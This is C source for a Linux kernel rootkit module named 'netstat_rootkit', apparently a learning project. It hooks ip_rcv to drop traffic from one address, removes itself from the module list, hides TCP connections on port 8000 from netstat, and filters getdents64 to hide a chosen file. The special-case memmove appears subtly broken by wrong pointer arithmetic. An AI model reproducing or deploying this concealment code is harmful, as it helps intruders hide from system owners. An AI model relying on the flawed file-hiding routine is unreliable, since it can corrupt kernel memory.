

#include "hooks.h"

asmlinkage int new_ip_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt,
 	   struct net_device *orig_dev){

	struct iphdr *ip_header = (struct iphdr *)skb_network_header(skb);
	unsigned int src_ip = (unsigned int)ip_header->saddr;
	
	if (src_ip == 0x01010101)
	{
		printk(KERN_INFO "a: found traffic from 1.1.1.1\n");
		return NET_RX_DROP;
	}
	//printk("hooked ip_rcv! hooray\n");
	return old_ip_rcv(skb, dev, pt, orig_dev);

}



static asmlinkage int new_m_show(struct seq_file *m, void *p)
{
	struct module *mod = list_entry(p, struct module, list);
	if (strcmp(mod->name, "netstat_rootkit") == 0)
	{
		printk(KERN_INFO "not so fast amigo\n");
		seq_puts(m,"");
		return 0;	
	}
	return old_m_show(m, p);
}


static asmlinkage int new_tcp4_seq_show(struct seq_file *seq, void *v)
{
	__u16 srcp;
	const struct inet_sock *inet;
	struct sock *sk = v;
	printk(KERN_INFO "hooked a call to tcp4_seq_show\n");
	if (v == SEQ_START_TOKEN)
		return old_tcp4_seq_show(seq, v);
	inet = inet_sk(sk);
	srcp = ntohs(inet->inet_sport);
	if (srcp == 8000){
		printk(KERN_INFO "netstat_rootkit: identified tcp traffic to port 8000\n");
		seq_puts(seq, "");
		return 0;
	}
	return old_tcp4_seq_show(seq, v);

}


asmlinkage int new_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
	unsigned int len;
	unsigned long index = 0;
	long error;

	dirent = (struct linux_dirent64*)(regs->si); // struct from userspace
	len = old_getdents64(regs); // here struct gets populated by syscall
	dirent_kern = kzalloc(len, GFP_KERNEL); 


	if(dirent_kern <=0 || (dirent_kern == NULL))
		return len;

	error = copy_from_user(dirent_kern, dirent, len); //copy the struct to kernel buffer.
	if (error)
		goto done;
	

	curr_ent = (void*)dirent_kern + index;
	prev_ent = curr_ent;

	while (index < len)
	{
		prev_ent = curr_ent;
		curr_ent = (void*)dirent_kern + index;
		
		if (strcmp(file_to_hide, curr_ent->d_name) == 0){
			printk(KERN_INFO "found secret file: %s",file_to_hide);
			if (index == 0 )// special case
			{
				len -= curr_ent->d_reclen;
				memmove(curr_ent, curr_ent+curr_ent->d_reclen, len);
			}
			else
			{
				prev_ent->d_reclen += curr_ent->d_reclen;
			}
		}
		index += curr_ent->d_reclen;
	}

	error = copy_to_user(dirent, dirent_kern, len);
	if (error)
		goto done;	

	done:
		kfree(dirent_kern);
		return len;
	
	
}
